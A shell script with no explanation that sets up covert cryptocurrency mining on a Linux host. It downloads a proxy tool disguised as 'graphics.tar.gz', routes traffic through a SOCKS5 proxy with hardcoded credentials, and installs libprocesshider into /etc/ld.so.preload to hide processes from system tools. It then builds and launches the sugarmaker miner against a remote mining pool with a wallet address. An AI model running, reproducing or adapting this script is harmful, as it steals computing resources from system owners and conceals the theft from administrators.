ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

sudo apt-get install build-essential libcurl4-openssl-dev autotools-dev automake -y

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END
listen = :2233
loglevel = 1
socks5 = 173.245.211.239:1080
socks5_username = G0tNyyR4nJ
socks5_password = N1DAYf9S7D
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

git clone https://github.com/hanifgz/libprocesshider.git
cd libprocesshider;make
sudo mv libprocesshider.so /usr/local/lib/;echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
cd ..



/graftcp/graftcp git clone https://github.com/decryp2kanon/sugarmaker.git
cd sugarmaker
./autogen.sh
./configure CFLAGS='-O3'
make
./sugarmaker -a YespowerNull -o stratum+tcps://stratum-asia.rplant.xyz:17017 -u web1qrl78aw74s4gyeg6xx0kp98zkkperxuyku0jlra.$(shuf -n 1 -i 1-9999999) -p c=BTE
